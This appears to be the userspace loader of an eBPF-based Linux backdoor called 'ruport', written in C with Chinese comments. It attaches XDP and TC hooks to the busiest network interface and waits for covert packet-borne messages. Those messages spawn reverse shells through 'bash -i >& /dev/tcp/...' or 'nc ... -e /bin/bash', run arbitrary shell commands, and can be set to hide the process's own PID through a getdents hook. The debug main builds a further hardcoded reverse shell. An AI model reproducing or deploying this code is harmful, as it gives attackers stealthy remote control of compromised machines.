#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <unistd.h>
#include <time.h>

#include <signal.h>

#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <linux/if_link.h>
#include <linux/pkt_cls.h>
#include "ruport.skel.h"
#include "ruport.xdp.skel.h"
#include "ruport.tc.skel.h"

#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/ethtool.h>
#include <linux/if.h>
#include <sys/ioctl.h>

// test
#include <ifaddrs.h>
//

#include "utils.h"
#include "types.h"
#include "log.h"


// 保存信息的节点
// 功能节点，
struct FunctionNode {
    int pid;
    __be32 cip;
    __be32 cport;
    
    struct FunctionNode *pre;
    struct FunctionNode *next; 
};

static __inline struct FunctionNode *createFunctionNode() {
    struct FunctionNode *node = malloc(sizeof(struct FunctionNode));
    node->pre = 0;
    node->next = 0;

    return node;
}


static __inline void appendFunctionNode(struct FunctionNode *header, 
                                        struct FunctionNode *node) {

    struct FunctionNode *p = header;

    while(1) {
        if (p->next == 0){
            p->next = node;
            node->pre = p;
            break;
        }

        p = p->next;
    }

}

static __inline struct FunctionNode* deleteFunctionNode(struct FunctionNode *header, 
                                                unsigned int cip, 
                                                unsigned int cport) {

    struct FunctionNode *p = header;
    struct FunctionNode *result = 0;

    while(1) {
        if (p->cip == cip && p->cport == cport){
            
            p->pre->next = p->next;
            p->next->pre = p->pre;

            result = p;
            break;
        }

        if (p->next == 0)
            break;

        p = p->next;
    }

    return result;
}

static __inline void clearFunctionNode(struct FunctionNode **header) {

        if (*header == 0)
            return;
        
        while(1) {
            struct FunctionNode *p = (*header)->next;
            
            if (p == 0)
                break;

            (*header)->next = p->next;
            free(p);
        }
        
        free(*header);
        *header = 0;

}

// code macro
#define lOCAL_SERVER 1
#define REGISTE_SIGNAL 1

// 默认服务端口
#define DEFAULT_SRV_PORT 2222

// global
// variables about bpf/sockmapxdp/tc
struct ruport_bpf *g_skel = 0;
struct ruport_sockmap *g_sockmap_skel = 0;
struct _xdptcinfo *g_xdpinfo = 0;
struct _xdptcinfo *g_tcinfo = 0;

#define MAX_NAME 255
#define MAX_BUF 1024


struct _xdptcinfo {
    int ifindex;
    struct ruport_xdp *xdp_skel;
    struct ruport_tc *tc_skel;
    int xdp_flags;
    struct bpf_xdp_attach_opts *xdp_opts;
    struct bpf_tc_hook *tc_hook_egress;
    struct bpf_tc_opts *tc_opts_egress;
    struct bpf_tc_hook *tc_hook_ingress;
    struct bpf_tc_opts *tc_opts_ingress;
};

//
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
	return vfprintf(stderr, format, args);
}

// bpf ////////////////////////////////////////////
// Setup Argument stuff
static struct env {
    int pid_to_hide;
    int target_ppid;
} env;

static int handle_event(void *ctx, void *data, size_t data_sz)
{
   // const struct event *e = data;
    return 0;
}
struct ruport_bpf *loadbpffilter() {
    struct ruport_bpf *skel = (struct ruport_bpf*)0;
	int err;
    struct ring_buffer *rb = NULL;

	/* Open BPF application */
	skel = ruport_bpf__open();
	if (!skel) {
        skel = (struct ruport_bpf*)0;
		goto exit;
	}
    // Set the Pid to hide, defaulting to our own PID
    char pid_to_hide[10];
    if (env.pid_to_hide == 0) {
        env.pid_to_hide = getpid();
    }
    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide)+1;
    skel->rodata->target_ppid = env.target_ppid;

	/* Load & verify BPF programs */
	err = ruport_bpf__load(skel);
	if (err) {
        skel = (struct ruport_bpf*)0;
		goto exit;
	}

     // Setup Maps for tail calls
    int index = 1;
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
    int ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto exit;
    }
    index = 2;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto exit;
    }

	/* Attach tracepoint handler */
	err = ruport_bpf__attach(skel);
	if (err) {
        skel = (struct ruport_bpf*)0;
		goto exit;
	}
    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto exit;
    }

exit:
    return skel;
}

void releasebpf(struct ruport_bpf *skel) {
    if (skel != 0) {
        ruport_bpf__destroy(skel);
    }
}

// xdp /////////////////////////////////////////////
struct _xdptcinfo* loadxdpfilter(int ifindex) {
    struct ruport_xdp *skel;
	int err;

	/* Open BPF application */
	skel = ruport_xdp__open();
	if (!skel) {
		return 0;
	}

	/* Load & verify BPF programs */
	err = ruport_xdp__load(skel);
	if (err) {
        return 0;
	}
    
    // 
    struct _xdptcinfo *pXDPTCInfo = (struct _xdptcinfo*)malloc(sizeof(struct _xdptcinfo));
    memset(pXDPTCInfo, 0, sizeof(struct _xdptcinfo));

    pXDPTCInfo->xdp_skel = skel;
    pXDPTCInfo->ifindex = ifindex;

    // --------------------- attach xdp ------------------------
    int flags = XDP_FLAGS_SKB_MODE;
    int xdp_fd = bpf_program__fd(skel->progs.xdp_parse);

    pXDPTCInfo->xdp_flags = flags;
    // opts
    struct bpf_xdp_attach_opts *xdp_opts = 0;
    memory_alloc(struct bpf_xdp_attach_opts, xdp_opts, 1);
    xdp_opts->sz = sizeof(struct bpf_xdp_attach_opts);

    // attach xdp
    err = bpf_xdp_attach(ifindex, xdp_fd, flags, xdp_opts);
    if (err) {
        goto error_xdp1;
    }
    pXDPTCInfo->xdp_opts = xdp_opts;
    pXDPTCInfo->xdp_opts->old_prog_fd = xdp_fd;

    goto exit;
error_xdp1:
    free_0(xdp_opts);
    free_0(pXDPTCInfo);
    ruport_xdp__destroy(skel);
exit:
    return pXDPTCInfo;
}

void releasexdp(struct _xdptcinfo* info) {
    if (info != 0) {
        if (info->xdp_skel != 0 && 
            info->ifindex != 0 &&
            info->xdp_opts != 0 ) {
            // release xdp
            bpf_xdp_detach(info->ifindex, info->xdp_flags, info->xdp_opts);
            // destory skel
            ruport_xdp__destroy(info->xdp_skel);
        }
    }
}

//tc////////////////////////////////////////////////
struct _xdptcinfo* loadtcfilter(int ifindex) {
    struct ruport_tc *skel;
	int err;

	/* Open BPF application */
	skel = ruport_tc__open();
	if (!skel) {
		return 0;
	}

	/* Load & verify BPF programs */
	err = ruport_tc__load(skel);
	if (err) {
        return 0;
	}
    
    // 
    struct _xdptcinfo *pXDPTCInfo = (struct _xdptcinfo*)malloc(sizeof(struct _xdptcinfo));
    memset(pXDPTCInfo, 0, sizeof(struct _xdptcinfo));

    pXDPTCInfo->tc_skel = skel;
    pXDPTCInfo->ifindex = ifindex;

    // ---------------------- attach tc ------------------------
    // hook tc egress (tx 出口)
    struct bpf_tc_hook *tc_hook_egress = 0;
    memory_alloc(struct bpf_tc_hook, tc_hook_egress, 1);
    tc_hook_egress->sz = sizeof(struct bpf_tc_hook);
    tc_hook_egress->ifindex = ifindex;
    tc_hook_egress->attach_point = BPF_TC_EGRESS;
    pXDPTCInfo->tc_hook_egress = tc_hook_egress;

    int tc_egress = bpf_program__fd(skel->progs.tc_egress);

    err = bpf_tc_hook_create(tc_hook_egress); // 0 as true
    err = err == -EEXIST ? 0:err;
	if (err < 0) {
 		goto error_tc1;       
    }
    // attach tc egress
    struct bpf_tc_opts *tc_opts_egress = 0;
    memory_alloc(struct bpf_tc_opts, tc_opts_egress, 1);
    tc_opts_egress->sz = sizeof(struct bpf_tc_opts);
    tc_opts_egress->handle = 1;
    tc_opts_egress->priority = 1;
    tc_opts_egress->prog_fd = tc_egress;
    pXDPTCInfo->tc_opts_egress = tc_opts_egress;

    err = bpf_tc_attach(tc_hook_egress, tc_opts_egress);
    if (err < 0) {
        goto error_tc2;
    }

    // hook tc ingress (rx 入口)
    struct bpf_tc_hook *tc_hook_ingress = 0;
    memory_alloc(struct bpf_tc_hook, tc_hook_ingress, 1);
    tc_hook_ingress->sz = sizeof(struct bpf_tc_hook);
    tc_hook_ingress->ifindex = ifindex;
    tc_hook_ingress->attach_point = BPF_TC_INGRESS;
    pXDPTCInfo->tc_hook_ingress = tc_hook_ingress;

    int tc_ingress = bpf_program__fd(skel->progs.tc_ingress);
    err = bpf_tc_hook_create(tc_hook_ingress);
    err = err == -EEXIST ? 0:err;
	if (err < 0) {
 		goto error_tc3;       
    }
    // attach tc ingress
    struct bpf_tc_opts *tc_opts_ingress = 0;
    memory_alloc(struct bpf_tc_opts, tc_opts_ingress, 1);
    tc_opts_ingress->sz = sizeof(struct bpf_tc_opts);
    tc_opts_ingress->handle = 1;
    tc_opts_ingress->priority = 1;
    tc_opts_ingress->prog_fd = tc_ingress;
    pXDPTCInfo->tc_opts_ingress = tc_opts_ingress;

    err = bpf_tc_attach(tc_hook_ingress, tc_opts_ingress);
    if (err < 0) {
        goto error_tc4;
    }


    goto exit;
error_tc4:
    free_0(tc_opts_ingress);
    bpf_tc_hook_destroy(tc_hook_ingress);
error_tc3:
    free_0(tc_hook_ingress);
error_tc2:
    free_0(tc_opts_egress);
    bpf_tc_hook_destroy(tc_hook_egress);
error_tc1:
    free_0(tc_hook_egress);
exit:
    return pXDPTCInfo;
}

void releasetc(struct _xdptcinfo* info) {
    if (info != 0) {
        if (info->tc_skel != 0 && 
            info->ifindex != 0 &&
            info->tc_hook_egress != 0 && 
            info->tc_opts_egress != 0 &&
            info->tc_hook_ingress != 0 &&
            info->tc_opts_ingress != 0) {
            // release tc egress
            info->tc_opts_egress->flags = info->tc_opts_egress->prog_fd = info->tc_opts_egress->prog_id = 0;           
            bpf_tc_detach(info->tc_hook_egress, info->tc_opts_egress);
            bpf_tc_hook_destroy(info->tc_hook_egress);
            // release tc ingress
            info->tc_opts_ingress->flags = info->tc_opts_ingress->prog_fd = info->tc_opts_ingress->prog_id = 0;
            bpf_tc_detach(info->tc_hook_ingress, info->tc_opts_ingress);
            bpf_tc_hook_destroy(info->tc_hook_ingress);
            // destory skel
            ruport_tc__destroy(info->tc_skel);
        }
    }
}

//
void releaseall() {
    // if (g_skel != 0) {
    //     releasebpf(g_skel);
    //     g_skel = 0;
    // }

    if (g_xdpinfo != 0) {
        releasexdp(g_xdpinfo);
        g_xdpinfo = 0;
    }

    if (g_tcinfo != 0) {
        releasetc(g_tcinfo);
        g_tcinfo = 0;
    }
}

// ip 2 string
int ip2str(unsigned int ipv4, char *output, int size) {
    if (output == 0){
        return 1;
    }

    struct in_addr addr;
    addr.s_addr = htonl(ipv4);

    strcpy_s(output, size, inet_ntoa(addr));

    return 0;
}

// 控制程序启动
// 路由生效要先于程序启动
struct FunctionNode * g_Header = 0;


// 根据消息操作路由表
int control_router(const struct Message *msg, int router_map) {
    unsigned char hiByte = (unsigned char)(msg->ins >> 8);
    unsigned char loByte = (unsigned char)msg->ins;   
    struct Router router;

    if (hiByte > 0) { // 删除路由
        __be64 key = (__be64)((__be64)(msg->cip) << 16) + (__be64)(msg->cport);
        int ret = bpf_map_lookup_and_delete_elem(router_map, &key, &router);
        if (ret == 0) {
            char destip[200];
            ip2str(ntohl(msg->cip), destip, 200);
            log_trace("delete a router: ip: %s, port: %d", destip, ntohs(router.cport));
        }
    } else { // 添加路由
            __be64 key = (__be64)((__be64)(msg->cip) << 16) + (__be64)(msg->cport);
            int ret = bpf_map_lookup_elem(router_map, &key, &router);
            if (ret == 0)
                return 1;
            else {
                char destip[200];
                ip2str(ntohl(msg->cip), destip, 200);
                log_trace("insert a router: ip: %s, port: %d", destip, ntohs(msg->cport));
                // 
                switch (loByte) {
                    case 0x01:
                        if (msg->nativeport == 0) {
                            log_trace("the nativeport is needed.");
                            break;                            
                        }
                    case 0x02:
                    case 0x03:
                        router.cip = msg->cip;
                        router.cport = msg->cport;
                        router.connport = msg->connport;
                        router.nativeport = msg->nativeport;
                        bpf_map_update_elem(router_map, &key, &router, BPF_ANY);
                        break;
                }
                
            }
    }

    return 0;
}
// 
int control_process(const struct Message *msg) {
    unsigned char hiByte = (unsigned char)(msg->ins >> 8);
    unsigned char loByte = (unsigned char)msg->ins;   
    
    // 获取当前路径
    char cwd[PATH_MAX + 1];
    if(getCurrentDir(cwd, PATH_MAX)){
        return 1;
    }

    const char *pname = (const char*)msg->ext;
    int lenofname = strlen(pname);
    // ip
    char destip[200];
    ip2str(ntohl(msg->cip), destip, 200);
    // port
    char destport[200];
    snprintf(destport, 200, "%d", ntohs(msg->cport));

    switch(loByte) {
        case 0x01: // 不处理，只是添加路由
        break;
        case 0x02: // 反弹
        {
            // kill
            if (hiByte > 0) {
                // 把子进程的数据
                struct FunctionNode *node = deleteFunctionNode(g_Header, msg->cip, msg->cport);
                if (node != 0) {
                    if (node->pid > 0)
                        kill(node->pid, SIGINT);

                    free(node);
                }
                
                return 0;
            }
            

            if (lenofname == 4 && strncmp("bash", pname, 4) == 0) {
                log_trace("-----------------bash------------------");

                char cmd[500];
                snprintf(cmd, 500, "bash -i >& /dev/tcp/%s/%s 0>&1", destip, destport);

                log_trace("cmd: %s", cmd);

                int pid = fork();
                if (pid < 0)
                    return 1;
                
                if (pid == 0) {
                    execl("/bin/sh","sh", "-c", cmd, (char*)0);
                } else {
                    // bash -i 这个形式的反弹木马
                    // 实际上fork出的子进程本身没有控制
                    // kill(pid, SIGINT);
                }
            } else if (lenofname == 2 && strncmp("nc", pname, 2) == 0) {
                log_trace("-----------------nc------------------");
                int pid = fork();
                if (pid < 0)
                    return 1;

                if (pid == 0) {
                    // nc 必须在和程序同一个目录
                    char pos_nc[PATH_MAX * 2];
                    snprintf(pos_nc, PATH_MAX * 2, "%s%s", cwd, "/nc");

                    char *argv[] = {
                        "nc", 
                        destip,
                        destport,
                        "-e",
                        "/bin/bash"
                    };

                    execvp(pos_nc, argv); 
                } else {
                    // 把子进程的数据
                    struct FunctionNode *node = createFunctionNode();
                    node->cip = msg->cip;
                    node->cport = msg->cport;
                    node->pid = pid;
                    appendFunctionNode(g_Header, node);
                }
                
            } else {
                return 1;
            }
        }
        break;
        case 0x03: // 执行shell命令
        {
            log_trace("-----------------execute shell------------------");
            int pid = fork();
            if (pid < 0) {
                return 1;
            }
            
            if (pid == 0) {
                execl("/bin/sh","sh", "-c", msg->ext, (char*)0);
            } else {
                // bash -i 这个形式的反弹木马
                // 实际上fork出的子进程本身没有控制
                // kill(pid, SIGINT);
            }
        }
        break;
        case 0x04: // 执行程序
        {
            
        }
        break;
    }

    return 0;
}


// 伺服线程
void * waitweakup_worker(void *arg) {

    // 初始化
    if (g_Header == 0) {
        g_Header = createFunctionNode();
    }

    log_trace("---------------------------waitweakup_worker------------------------");

    // 获取map
    int message_map = bpf_object__find_map_fd_by_name(g_xdpinfo->xdp_skel->obj, "message_map");
    // router map
    int router_map = bpf_object__find_map_fd_by_name(g_tcinfo->tc_skel->obj, "router_map");
    while(1) {
        // 处理消息
        __be64 key = 0, next_key;
        struct Message msg;

        while(bpf_map_get_next_key(message_map, &key, &next_key) == 0) {
            bpf_map_lookup_and_delete_elem(message_map, &next_key, &msg);

            log_trace("receive a message");

            control_router(&msg, router_map);
            control_process(&msg);

            key = next_key;
        }
        
        sleep(1);
        
    }

    return 0;
}


// 注册处理信号
// -------------------------------------------
#if REGISTE_SIGNAL
// SIGINT
void stop(int signo) {
    releaseall();
    exit(1);
}

void setsigint() {
    signal(SIGINT, stop);
    signal(SIGSEGV, stop);
}

#else
#define setgigint()
#endif
// --------------------------------------------

// 获取网卡的信息
// --------------------------------------------
static int get__common_netdev_ifindex()
{
    char netdev_name[IFNAMSIZ] = {0};
	char name[IFNAMSIZ] = {0};
    unsigned long txbytes;
	unsigned long  rx_bytes, rx_packets, rx_errs, rx_drops,
	rx_fifo, rx_frame,
	tx_bytes, tx_packets, tx_errs, tx_drops,
	tx_fifo, tx_colls, tx_carrier, rx_multi;

	char buf[512];
	FILE *fp = fopen("/proc/net/dev", "r");
	if (fp == NULL) {
		perror("fopen");
		return -1;
	}

	fgets(buf, sizeof(buf), fp);
	fgets(buf, sizeof(buf), fp);

	while (fgets(buf, sizeof(buf), fp) != NULL) {
		char *ptr;
		buf[sizeof(buf) - 1] = 0;
		if ((ptr = strchr(buf, ':')) == NULL ||
		    (*ptr++ = 0, sscanf(buf, "%s", name) != 1)) {
			return -1;
		}
		if (sscanf(ptr, "%ld%ld%ld%ld%ld%ld%ld%*d%ld%ld%ld%ld%ld%ld%ld",
			   &rx_bytes, &rx_packets, &rx_errs, &rx_drops,
			   &rx_fifo, &rx_frame, &rx_multi,
			   &tx_bytes, &tx_packets, &tx_errs, &tx_drops,
			   &tx_fifo, &tx_colls, &tx_carrier) != 14)
			continue;

        if (strcmp(name, "lo") == 0)
            continue;
		if (tx_bytes > txbytes) {
            txbytes = tx_bytes;
            memset(netdev_name, 0, IFNAMSIZ);
            strcpy_s(netdev_name, IFNAMSIZ, name);
        }
	}
    fclose(fp);

    if (txbytes != 0 && strlen(netdev_name) > 0) {
        int ifindex = 0;
        ifindex = if_nametoindex(netdev_name);
        if (!ifindex) {
            return 0;
        } else {
            return ifindex;
        }
    }

	return 0;
}


#define DEBUG 0

#if !DEBUG

int main(int argc, char** argv) {
    // analyze argumens
    int opt;
    char flag[] = {0};
    u_int32_t ifindex = 0;
    long port = 0;
    int bHidden = 0;
    int status = 0;

    while((opt = getopt(argc, argv, "f:p:i:H")) != -1) {
        switch (opt)
        {
        case 'd':
            strcpy_s(flag, MAX_NAME, optarg);
            break;
        case 'p':
            {
                char *tail = (char*)0;
                errno = 0;
                port = strtol(optarg, &tail, 0);
                if (errno) {
                    printf("port error\n");
                    exit(1);
                }

                if (port <= 0 || port > 65535) {
                    printf("port error\n");
                    exit(1);
                }            
            }
            break;
        case 'i': // iface
            {
                ifindex = if_nametoindex(optarg);
                if (!ifindex) {
                    perror("failed to resolve iface to ifindex\n");
                    exit(1);
                }
            }
            break;
        case 'H':
            bHidden = 1;
            break;
        default:
            break;
        }
    }

    // must have a ifindex
    // if (!ifindex) {
    //     printf("failed to resolve iface to ifindex\n");
    //     exit(0);
    // }
    if (!ifindex) {
        ifindex = get__common_netdev_ifindex();
        if (!ifindex) {
            perror("failed to resolve iface to ifindex\n");
            exit(0);
        }
    }

    // set SIGINT
    setsigint();
 
    // base settings
    libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
	/* Set up libbpf errors and debug info callback */
	libbpf_set_print(libbpf_print_fn);
    // ok~~~
    // load pbf
    // g_skel = loadbpffilter();
    // if (!g_skel) {
    //     perror("load bpf error.\n");
    //     exit(1);
    // }
    
    // load xdp
    g_xdpinfo = loadxdpfilter(ifindex);
    if (!g_xdpinfo) {
        perror("load xdp/tc error.\n");
        status = 1;
        goto release_bpf;
    }

    // load tc
    g_tcinfo = loadtcfilter(ifindex);
    if (!g_tcinfo) {
        perror("load tc error.\n");
        status = 1;
        goto release_xdp;
    }

    // create a accpet thread
    pthread_t pthread_accept;
    int ret =pthread_create(&pthread_accept, NULL, waitweakup_worker, 0);
    if (ret != 0) {
        printf("\n create accept thread faild.");
        exit(-1);
    }

    void *thread_ret;
    pthread_join(pthread_accept, &thread_ret);


    releasetc(g_tcinfo);
release_xdp:
    releasexdp(g_xdpinfo);
release_bpf:
    //releasebpf(g_skel);

    // 清理功能链表
    clearFunctionNode(&g_Header);
    // 
    printf("-----------------------------------end-------------------------\n");
    fflush(stdout);

    return status;
}
#else

int main(int argc, char **argv) {
    // 获取当前路径
    char cwd[PATH_MAX + 1];
    if(getCurrentDir(cwd, PATH_MAX)){
        return 1;
    }
    // ip
    char destip[200];
    int ret = ip2str(ntohl(2182025388), destip, 200);
    if (ret != 0) {
        return 1;
    }
    // port
    char destport[200];
    snprintf(destport, 200, "%d", ntohl(htonl(12345)));
    char *cmd_type = "nc";
    // 创建进程
    if (strncmp("bash", cmd_type, 4) == 0) { // 启动 bash shell
        int pid = fork();
        if (pid < 0) {
            printf("error\n");
            return 1;
        }
        if (pid == 0) {
            char cmd[500];
            snprintf(cmd, 500, "bash -i >& /dev/tcp/%s/%s 0>&1", destip, destport);
            printf(":%d\n", getppid());
            execl("/bin/sh","sh", "-c", cmd, 0);            
        } else {
            kill(pid, SIGINT);
            printf("child process pid is: %d\n", pid);
        }


    } else if (strncmp("nc", cmd_type, 2) == 0) { // 启动nc
        int pid = fork();
        if (pid <  0) {
            printf("error\n");
            return 1;
        }
        if (pid == 0) {
            // nc 必须在和程序同一个目录
            char pos_nc[PATH_MAX * 2];
            snprintf(pos_nc, PATH_MAX * 2, "%s%s", cwd, "/nc");

            char *argv[] = {
                "nc", 
                destip,
                destport,
                "-e",
                "/bin/bash"
            };

            ret = execvp(pos_nc, argv);
            if (ret < 0) {
                return 1;
            }            
        } else {
            printf("child process pid is: %d\n", pid);
        }


    } else {
        return 1;
    }

}

#endif

